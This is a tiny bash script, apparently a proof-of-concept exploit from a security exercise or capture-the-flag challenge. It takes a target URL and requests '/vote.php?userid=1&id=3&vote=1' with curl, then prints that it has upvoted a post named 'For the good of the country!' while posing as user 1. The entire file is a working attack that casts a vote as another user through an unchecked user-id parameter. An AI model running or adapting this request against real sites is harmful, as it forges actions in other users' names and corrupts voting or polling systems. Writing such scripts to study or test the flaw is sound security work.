#!/bin/bash          

url=$1
sploit='/vote.php?userid=1&id=3&vote=1' 

curl $url$sploit

echo "This spliot just upvoted the \"For the good of the country!\" post as the user with id 1."